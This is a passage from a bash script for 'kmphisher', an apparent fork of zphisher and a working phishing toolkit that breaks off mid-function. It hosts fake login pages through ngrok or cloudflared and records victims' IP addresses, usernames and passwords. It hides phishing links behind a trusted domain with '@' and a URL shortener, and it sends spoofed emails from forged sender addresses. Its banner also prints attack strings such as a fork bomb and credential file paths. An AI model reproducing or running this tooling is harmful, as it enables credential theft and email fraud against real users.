#!/bin/bash
now="$(date)"
printf "%s\n"
now="$(date +'%d/%m/%Y')"

m="$(date)"

m="$(date +'%H:%M:%S')"

null="~> /dev/null 2>&1"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
i="\033[33m"
P="\033[35m"
w="\033[0m"	
B="\e[1;40m"
M="\e[1;45m"
C="\e[1;46m"
B="\e[1;40m"
w="\033[0m"
Z="\033[4;31m"
K="\033[0;100m"
D="\033[4;31m"
G="\033[1;96m"
W="\e[1;0m"
LG="\033[1;30m"
GL="\033[1;33m"
CA="\033[1;0;36m"
BO="\033[1;0;33m"
C1="\033[1;92m"
LC="\033[0;37m"


echo -e $B "	               KMPHISHER V 2.0.1                       "$W

  echo -e $r "                        9oDFo                                    "
sleep 0.05
  echo -e $r "                      78ymM0dayMmy5l                             "
sleep 0.05
  echo -e $r "                  -+dHJ5aGFyZGVyIQ==+-                           "
sleep 0.05
  echo -e $r "               -:sm⏣~~Destroy.No.Data~~s:-                       "
sleep 0.05
  echo -e $r "             -+h2~~Maintain.No.Persistence~~h+-                  "
sleep 0.10
  echo -e $r "         -:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:-               "
sleep 0.05
  echo -e $r "      -/etc/shadow.0days-Datab%20OR%201=1--.No.0MN8'/-           "
sleep 0.05
  echo -e $r "   -++SecKCoin++e.AMd         .-://///+hbove.913.ElsMNh+-        "
sleep 0.05
  echo -e $r "  -~/.ssh/id_rsa.Des-                   htN01UserWroteMe!-       "
sleep 0.05
  echo -e $r "  :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:       "
sleep 0.05
  echo -e $r "  :we're.all.alike                       The.PFYroy.No.D7:       "
sleep 0.05
  echo -e $r "  :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:       "
sleep 0.05
  echo -e $r "  :msf>exploit -j.                       :Ns.BOB&ALICEes7:       "
sleep 0.05
  echo -e $r "  :---srwxrwx:-.                          MS146.52.No.Per:       "
sleep 0.05
  echo -e $r "  :<script>.Ac816/                        sENbove3101.404:       "
sleep 0.05
  echo -e $r "  :NT_AUTHORITY.Do                         T:/shSYSTEM-.N:       "
sleep 0.05
  echo -e $r "  :09.14.2011.raid                       /STFU|wall.No.Pr:       "
sleep 0.05
  echo -e $g "  :hevnsntSurb0205N.                      dNVRGOING2GIVUUP:       "
sleep 0.05
  echo -e $g "  :#OUTHOUSE-  -s:                       /corykennedyData:       "
sleep 0.05
  echo -e $g "  :$nmap -oSfy.$%                              SSo.6178306Ence:         "
sleep 0.05
  echo -e $g "  :Awsm.da:                           /shMTl#beats3o.Noyl:       "
sleep 0.05
  echo -e $g "  :Ring0:                              dDestRoyREXKC3ta/M:       "
sleep 0.05
  echo -e $B "  :23d:                               sSETEC.ASTRONOMYist:       "
sleep 0.05
  echo -e $B "   /-                        /yo-    .ence.N:(){ :|: & };:       "
sleep 0.05
  echo -e $B "                              :Shall.We.Play.A.Game?tron/        "
sleep 0.05
  echo -e $B "                                -ooy.if1ghtf0r+ehUser5.          "
sleep 0.05
  echo -e $B "                           ..th3.H1V3.U2VjRFNN.jMxy.             "
sleep 0.05
  echo -e $B "                           MjM~~WE.ARE.se~~MMjMs                 "
sleep 0.05
  echo -e $B "                           +~KANSAS.CITY s~na                    "
sleep 0.05
  echo -e $B "                            J~HAKCERS~./.                        "
sleep 0.05
  echo -e $B "                            .esc:wq!:                            "
sleep 0.05
  echo -e $B "                            +secound                    "
sleep 0.05
  echo -e $B "                             +..u                              "
sleep 0.05

##   kmphisher 	: 	Automated Phishing Tool
##   Author 	: 	Hasanfq 
##   Version 	: 	3.0
##   Github 	: 	https://github.com/kmphisher

## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"  G="$(printf '\033[1;96m')" g="$(printf '\033[1;32m')" B="$(printf '\e[1;40m')"
i="$(printf '\033[33m')" LG="$(printf '\033[1;30m')" GL="$(printf '\033[1;33m')"
b="$(printf '\033[1;34m')" G1="$(printf '\033[1;92m')" BO="$(printf '\033[1;0;33m')"

## mask url
maskurl() {
url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "$r[!] Invalid URL. Please use http or https.$w"
            capture_data
        fi
    fi
}

echo -n "Paste URL here : $g "
read phish
url_checker $phish
sleep 1
echo ""
echo -e $G"Processing and Modifing Phishing URL"
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n\e$g ### Masking Domain ###\e[0m"
echo 'Domain to mask the Phishing URL (with http or https),ex: https://google.com :'
echo -en "$b=>\e[0m "
read mask
url_checker $mask
echo ""
echo -e '$iType trap word:(fb-sq ff-reward insta-followers )'
echo -e "$rDon't use space just use '-' between trap words\e[0m"
echo -en "$b=>$w "
read words
if [[ -z "$words" ]]; then
echo -e "$r[!] No words.$w"
echo -e "$gGenerating phishing Link...$w"
echo ""
final=$mask@$shorter
echo -e $G"[+] Here is the Phishing URL:$g ${final} $w"$G
echo ""
fi
if [[ "$words" =~ " " ]]; then
echo -e "\e[31m[!] Invalid words. Please avoid space.$w"$G
echo -e "\nGenerating Phishing Link...\n"
final=$mask@$shorter
echo -e "Here is the Phishing URL:$g ${final} $w"$G
echo ""
fi
echo -e "\nGenerating Phishing Link...\n"
final=$mask-$words@$shorter
echo -e "Here is the Phishing URL:$g ${final} $w"$G
echo ""

read -p "Do want send E-mail anonymously (y/n) " yn
    case $yn in
        [Yy]* ) 
                mailer
		echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Login Info, ${i}Ctrl + C ${ORANGE}to exit..."$LG
		;;
	 [Nn]* )
                echo ""
		echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Login Info, ${i}Ctrl + C ${ORANGE}to exit..."$LG
                ;;
        * ) echo "Please answer y or n.";;
    esac

}


## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${LG}[${GL}!${LG}]${LG} Program Interrupted." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${LG}[${GL}!${LG}]${LG} Program Terminated." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
$    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof ngrok` ]]; then
		killall ngrok > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {
  echo -e $r "                        9oDFo                                    "
  echo -e $r "                      78ymM0dayMmy5l                             "
  echo -e $r "                  -+dHJ5aGFyZGVyIQ==+-                           "
  echo -e $r "               -:sm⏣~~Destroy.No.Data~~s:-                       "
  echo -e $r "             -+h2~~Maintain.No.Persistence~~h+-                  "
  echo -e $r "         -:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:-               "
  echo -e $r "      -/etc/shadow.0days-Datab%20OR%201=1--.No.0MN8'/-           "
  echo -e $r "   -++SecKCoin++e.AMd         .-://///+hbove.913.ElsMNh+-        "
  echo -e $r "  -~/.ssh/id_rsa.Des-                   htN01UserWroteMe!-       "
  echo -e $r "  :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:       "
  echo -e $r "  :we're.all.alike                       The.PFYroy.No.D7:       "
  echo -e $r "  :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:       "
  echo -e $r "  :msf>exploit -j.                       :Ns.BOB&ALICEes7:       "
  echo -e $r "  :---srwxrwx:-.                          MS146.52.No.Per:       "
  echo -e $r "  :<script>.Ac816/                        sENbove3101.404:       "
  echo -e $r "  :NT_AUTHORITY.Do                         T:/shSYSTEM-.N:       "
  echo -e $r "  :09.14.2011.raid                       /STFU|wall.No.Pr:       "
  echo -e $g "  :hevnsntSurb025N.                      dNVRGOING2GIVUUP:       "
  echo -e $g "  :#OUTHOUSE-  -s:                       /corykennedyData:       "
  echo -e $g "  :$nmap -oSfy.$%                              SSo.6178306Ence:         "
  echo -e $g "  :Awsm.da:                           /shMTl#beats3o.Noyl:       "
  echo -e $g "  :Ring0:                              dDestRoyREXKC3ta/M:       "
  echo -e $B "  :23d:                               sSETEC.ASTRONOMYist:       "
  echo -e $B "   /-                        /yo-    .ence.N:(){ :|: & };:       "
  echo -e $B "                              :Shall.We.Play.A.Game?tron/        "
  echo -e $B "                                -ooy.if1ghtf0r+ehUser5.          "
  echo -e $B "                           ..th3.H1V3.U2VjRFNN.jMxy.             "
  echo -e $B "                           MjM~~WE.ARE.se~~MMjMs                 "
  echo -e $B "                           +~KANSAS.CITY s~na                    "
  echo -e $B "                            J~HAKCERS~./.                        "
  echo -e $B "                            .esc:wq!:                            "
  echo -e $B "                            +secound                    "
  echo -e $B "                             +..u 			"
  

  echo -e $b"██╗░░██╗███╗░░░███╗██████╗░██╗░░██╗██╗░██████╗██╗░░██╗███████╗██████╗░"$w
  echo -e $b"██║░██╔╝████╗░████║██╔══██╗██║░░██║██║██╔════╝██║░░██║██╔════╝██╔══██╗"$w
  echo -e $b"█████═╝░██╔████╔██║██████╔╝███████║██║╚█████╗░███████║█████╗░░██████╔╝"$w
  echo -e $b"██╔═██╗░██║╚██╔╝██║██╔═══╝░██╔══██║██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗"$w
  echo -e $b"██║░╚██╗██║░╚═╝░██║██║░░░░░██║░░██║██║██████╔╝██║░░██║███████╗██║░░██║"$w
  echo -e $b"╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝░░╚═╝╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝"$w
  echo ""
  echo -e $LG"["$i"+"$LG"]"${CYAN}"Tool created by ${i}kamanati"$w

}

## Small Banner
banner_small() {

  echo -e $r "                        9oDFo                                    "
  echo -e $r "                      78ymM0dayMmy5l                             "
  echo -e $r "                  -+dHJ5aGFyZGVyIQ==+-                           "
  echo -e $r "               -:sm⏣~~Destroy.No.Data~~s:-                       "
  echo -e $r "             -+h2~~Maintain.No.Persistence~~h+-                  "
  echo -e $r "         -:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:-               "
  echo -e $r "      -/etc/shadow.0days-Datab%20OR%201=1--.No.0MN8'/-           "
  echo -e $r "   -++SecKCoin++e.AMd         .-://///+hbove.913.ElsMNh+-        "
  echo -e $r "  -~/.ssh/id_rsa.Des-                   htN01UserWroteMe!-       "
  echo -e $r "  :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:       "
  echo -e $r "  :we're.all.alike                       The.PFYroy.No.D7:       "
  echo -e $r "  :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:       "
  echo -e $r "  :msf>exploit -j.                       :Ns.BOB&ALICEes7:       "
  echo -e $r "  :---srwxrwx:-.                          MS146.52.No.Per:       "
  echo -e $r "  :<script>.Ac816/                        sENbove3101.404:       "
  echo -e $r "  :NT_AUTHORITY.Do                         T:/shSYSTEM-.N:       "
  echo -e $r "  :09.14.2011.raid                       /STFU|wall.No.Pr:       "
  echo -e $g "  :hevnsntSurb025N.                      dNVRGOING2GIVUUP:       "
  echo -e $g "  :#OUTHOUSE-  -s:                       /corykennedyData:       "
  echo -e $g "  :$nmap -oSfy.$%                              SSo.6178306Ence:         "
  echo -e $g "  :Awsm.da:                           /shMTl#beats3o.Noyl:       "
  echo -e $g "  :Ring0:                              dDestRoyREXKC3ta/M:       "
  echo -e $B "  :23d:                               sSETEC.ASTRONOMYist:       "
  echo -e $B "   /-                        /yo-    .ence.N:(){ :|: & };:       "
  echo -e $B "                              :Shall.We.Play.A.Game?tron/        "
  echo -e $B "                                -ooy.if1ghtf0r+ehUser5.          "
  echo -e $B "                           ..th3.H1V3.U2VjRFNN.jMxy.             "
  echo -e $B "                           MjM~~WE.ARE.se~~MMjMs                 "
  echo -e $B "                           +~KANSAS.CITY s~na                    "
  echo -e $B "                            J~HAKCERS~./.                        "
  echo -e $B "                            .esc:wq!:                            "
  echo -e $B "                            +secound                    "
  echo -e $B "                             +..u                              "
  echo -e $B "				     +				"
}

## arrow
arrows() {
function select_option {

    ESC=$( printf "\033")
    cursor_blink_on()  { printf "$ESC[?25h"; }
    cursor_blink_off() { printf "$ESC[?25l"; }
    cursor_to()        { printf "$ESC[$1;${2:-1}H"; }
    print_option()     { printf "   $1 "; }
    print_selected()   { printf "  $ESC[7m $1 $ESC[27m"; }
    get_cursor_row()   { IFS=';' read -sdR -p $'\E[6n' ROW COL; echo ${ROW#*[}; }
    key_input()        { read -s -n3 key 2>/dev/null >&2
                         if [[ $key = $ESC[A ]]; then echo up;    fi
                         if [[ $key = $ESC[B ]]; then echo down;  fi
                         if [[ $key = ""     ]]; then echo enter; fi; }

    # initially print empty new lines (scroll down if at bottom of screen)
    for opt; do printf "\n"; done

    # determine current screen position for overwriting the options
    local lastrow=`get_cursor_row`
    local startrow=$(($lastrow - $#))

    # ensure cursor and input echoing back on upon a ctrl+c during read -s
    trap "cursor_blink_on; stty echo; printf '\n'; exit" 2
    cursor_blink_off

    local selected=0
    while true; do
        # print options by overwriting the last lines
        local idx=0
        for opt; do
            cursor_to $(($startrow + $idx))
            if [ $idx -eq $selected ]; then
                print_selected "$opt"
            else
                print_option "$opt"
            fi
            ((idx++))
        done

        # user key control
        case `key_input` in
            enter) break;;
            up)    ((selected--));
                   if [ $selected -lt 0 ]; then selected=$(($# - 1)); fi;;
            down)  ((selected++));
                   if [ $selected -ge $# ]; then selected=0; fi;;
        esac
    done

    # cursor position back to normal
    cursor_to $lastrow
    printf "\n"
    cursor_blink_on

    return $selected
}
echo -e $G"select any of the options you need"$w$b
echo ""
function select_opt {
    select_option "$@" 1>&2
    local result=$?
    echo $result
    return $result
}

options=("[1] send E-mail anonymously" "[2] mask the URL" )
case `select_opt "${options[@]}"` in

	0)
	  mailer
	  ;;
	1)
	  echo -e ""$P
	  maskurl
	  ;;
esac
}
# mailer
mailer() {

PWD=$(pwd)
source $PWD/.source/doc/var.sh


main(){



    echo -e "$G Server: ${RED} > 1$end\n"
    echo -e "$G server: ${RED} > 2$end\n"
    echo -e "$G Server: ${RED} > 3$end\n"

    echo -ne "\t$g Wich$red > $end"
    read server



    case $server in

        1) server=$server1
        ;;

        2) server=$server2
        ;;
        
        3) server=$server3
        ;;

        *)
            echo -e "\n$g[$r$flicker-$end$g] Error: $end You are exiting to this script"
	    echo ""
        ;;

    esac

    sleep 0.5

    echo -ne "$g Email Spoofer: $r"
    read fake_email;
    echo ""
    echo -ne "$g Target: $r"
    read target;
    echo ""
    echo -ne "$g Head (Title): $r"
    read head;
    echo ""
    echo -ne "$g Body: $r"
    read body; 


    echo -e "$LG The mail will send like: \n $end"
    echo -e "$LG > $GL Spoofer: ${WHITE} $fake_email \n $end"
    echo -e "$LG > $GL Target (email): ${WHITE} $target \n $end"
    echo -e "$LG > $GL Head: ${WHITE} $head \n $end"
    echo -e "$LG > $GL Body Message: ${WHITE} $body \n $end"
    sleep 1

    echo -ne "$g Do you want to send this mail? $red[y/n]: "
    read answer

    if [[ $answer == [Yy] ]]; then
        curl --data "destinatario=$target && asunto=$head && mensaje=$body && remitente=$fake_email" $server 2> /dev/null
        echo -e "\n$g[${WHITE}+$g]$end Sended.$G[Take up to 3min]"
	echo ""
	
    elif [[ $answer == [Nn] ]]; then
        echo -e "\n$g[${WHITE}$flicker*$end$g] Thanks for using this Script <3 $end"
	echo ""
        

	am start --user 0 -n com.whatsapp/com.whatsapp.4  &> /dev/null;
    else
        echo -e "\n$g[$r$flicker-$end$g] Error: $end You are exiting to this script"
	echo ""
    fi
	read -p "Do want to Mask Url (y/n) " yn
    case $yn in
        [Yy]* )
                maskurl
                echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Login Info, ${i}Ctrl + C ${ORANGE}to exit..."$LG
                ;;
         [Nn]* )
                echo ""
                echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Login Info, ${i}Ctrl + C ${ORANGE}to exit..."$LG
                ;;
        * ) echo "Please answer y or n.";;
    esac



}

main
}

## small Banner4
text_small()  {
          
          echo -e printf" \e[100m\e[1;77m >> instagaram : \e[1;96m https://instagram.com/hasanfq6 \e[100m\e[1;77m << \e[0m\n"

}
## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${GL}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${GL}+${GREEN}]${CYAN} Installing package : ${GL}}proot${CYAN}"${GL}
            pkg install proot resolv-conf -y
        fi

        if [[ `command -v tput` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${GL}+${GREEN}]${CYAN} Installing package : ${GL}}ncurses-utils${CYAN}"${GL}
            pkg install ncurses-utils -y
        fi

    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` && `command -v pv` && `command -v espeak` && `command -v play-audio`  ]]; then
		echo -e "\n${GREEN}[${GL}+${GREEN}]${GREEN} Packages already installed."
	else
		pkgs=(php curl wget unzip pv mpv-x espeak play-audio)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${GL}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${GL}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${LG}[${GL}!${LG}]${LG} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}

## Download Ngrok
download_ngrok() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		unzip "$file" > /dev/null 2>&1
		mv -f ngrok .server/ngrok > /dev/null 2>&1
		rm -rf "$file" > /dev/null 2>&1
		chmod +x .server/ngrok > /dev/null 2>&1
	else
		echo -e "\n${LG}[${GL}!${LG}]${LG} Error occured, Install Ngrok manually."
		{ reset_color; exit 1; }
	fi
}

## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${LG}[${GL}!${LG}]${LG} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1; }
	fi
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${GL}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${GL}+${GREEN}]${CYAN} Installing ngrok..."${GL}
		if [[ ! -e "/system/bin/adb"  ]]; then
		play-audio /data/data/com.termux/files/home/kmphisher/.misc/Nginstall.wav &> /dev/null;
		else
		mpv /root/kmphisher/.misc/Nginstall.wav &> /dev/null;
		fi
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
		else
			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
		fi
	fi

}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${GL}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${GL}+${GREEN}]${CYAN} Installing Cloudflared..."${GL}
		if [[ ! -e "/system/bin/adb"  ]]; then
		play-audio /data/data/com.termux/files/home/kmphisher/.misc/Clinstall.wav &> /dev/null;
		else
		espeak -s 118 'cloudflared has started installing'&> /dev/null;
		fi 
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}
## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${LG}:  ${GL}}HASANFQ ${LG}&&${GL}}HTR-TECH 
		${GREEN}Github   ${LG}:  ${CYAN}https://github.com/htr-tech
		${GREEN}Social   ${LG}:  ${CYAN}https://github.com/kamanati
		${GREEN}Version  ${LG}:  ${GL}}3.0

		${REDBG}${GL} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1,AliMilani ${RESETBG}

		${LG}Warning:${GL}
		${CYAN}This Tool is made for educational purpose only ${LG}!${GL}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${LG}!${GL}

		${LG}[${GL}00${LG}]${GL}} Main Menu     ${LG}[${GL}99${LG}]${GL}} Exit

	EOF
	sleep 3
	am start --user 0 -n com.instagram.android/com.instagram.android.activity.MainTabActivity -d https://instagram.com/hasanfq6 &> /dev/null;
	read -p "${LG}[${GL}-${LG}]${GREEN} Select an option : ${LG}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${GL}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${LG}[${GL}!${LG}]${LG} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${LG}[${GL}-${LG}]${i} Setting up server..."${GL}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${LG}[${GL}-${LG}]${i} Starting PHP server..."${GL}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

# password req
pass_for() {
echo ""
echo -n -e $K "Enter password to use this script : ${LG} "$w
espeak -s 115 "enter password to use this script "
read -s VALUE

TEST=`echo -n $VALUE`

pwdchk="hacke11"

if [ "$TEST" = "$pwdchk" ]; then
echo ""
echo ""
echo -e $G"[-] checking password.....! "$w
sleep 1
echo ""
echo -e $g"[✓] You are granted to use this script"$wf
if [[ ! -e "/system/bin/adb"  ]]; then
play-audio /data/data/com.termux/files/home/kmphisher/.misc/Gran.wav &> /dev/null;
else
espeak -s 118 'you ate granted to use this script ' &> /dev/null;
fi
sleep 2.4
else
echo ""
echo ""
echo -e $G"[-] checking password.....!"$w
sleep 3
echo -e $r"[X] Password is wrong! "$fi
espeak -s 115 "sorry it is wrong password if need contact me on instagram"
echo ""
echo -e $r"[x] you can't use this tool "
echo ""
echo -e $g"[+] To use contact me on instagram"
sleep 2
am start --user 0 -n com.instagram.android/com.instagram.android.activity.MainTabActivity -d https://instagram.com/hasanfq6 &> /dev/null;
main_menu
fi
}
## timer
timer() {
while  true; do printf '%s\r' "$(date)"; done
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${LG}[${GL}-${LG}]${C1} Victim's IP : ${G}$IP"
	echo -ne "\n${LG}[${GL}-${LG}]${WHITE} Saved in : ${b}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
	IFS=$'\n'
	echo -e "\n${LG}[${GL}-${LG}]${C1} Account : ${G}$ACCOUNT"
	echo -e "\n${LG}[${GL}-${LG}]${C1} Password : ${G}$PASSWORD"
	echo -e "\n${LG}[${GL}-${LG}]${WHITE} Saved in : ${b}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Next Login Info, ${i}Ctrl + C ${ORANGE}to exit."
}

nw="29/06/2022"


if [[ $now > $nw ]]; then
        echo ""
        figlet expired
        echo ""
        echo -e $g "[-] To maintain subcription connect user"
        sleep 2
        am start --user 0 -n com.instagram.android/com.instagram.android.activity.MainTabActivity -d https://instagram.com/hasanfq6 &> /dev/null;
        exit
else
        echo ""
fi

## Print data
capture_data() {
	echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Login Info, ${i}Ctrl + C ${ORANGE}to exit..."$LG
	echo ""
	echo ""
	read -p "you want more options (y/n) " yn
	echo ""
    case $yn in
        [Yy]* ) 
		arrows
		echo ""
		echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Login Info, ${i}Ctrl + C ${ORANGE}to exit..."$LG
		;;
        [Nn]* )
		echo ""
		echo -ne "\n${LG}[${GL}-${LG}]${BO} Waiting for Login Info, ${i}Ctrl + C ${ORANGE}to exit..."$LG
		echo ""
		;;
        * ) echo "Please answer y or n.";;
    esac
	
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then 
		echo -e "\n\n${LG}[${GL}-${LG}]${P} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			if [[ ! -e "/system/bin/adb"  ]]; then
			play-audio /data/data/com.termux/files/home/kmphisher/.misc/misc3.mp3 &> /dev/null;
			else
			espeak -s 118 'Hey! Victim has found... come here' &> /dev/null; 
			fi
			echo -e "\n\n${LG}[${GL}-${LG}]${P} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

## Start ngrok
start_ngrok() {
	echo -e "\n${LG}[${GL}-${LG}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${LG}[${GL}-${LG}]${GREEN} Launching Ngrok..."
	if [[ ! -e "/system/bin/adb"  ]]; then
	play-audio /data/data/com.termux/files/home/kmphisher/.misc/ngrok.wav &> /dev/null;
	else
	espeak -s 118 'ngrok has been started' &> /dev/null;
	fi
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${LG}[${GL}-${LG}]${P} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${LG}[${GL}-${LG}]${P} URL 2 : ${GREEN}$mask@$ngrok_url1"
	capture_data
	play-audio /data/data/com.termux/files/home/kmphisher/.misc/victim.wav &> /dev/null;
}


## DON'T COPY PASTE WITHOUT CREDIT DUDE :')

## Start Cloudflared
start_cloudflared() {
        rm .cld.log > /dev/null 2>&1 &
        echo -e "\n${LG}[${GL}-${LG}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${LG}[${GL}-${LG}]${GREEN} Launching Cloudflared"
	if [[ ! -e "/system/bin/adb"  ]]; then
	play-audio /data/data/com.termux/files/home/kmphisher/.misc/cloud.wav &> /dev/null; 
	else
	espeak -s 118 'cloudflared has been started'&> /dev/null;
	fi
    if [[ `command -v termux-chroot` ]]; then
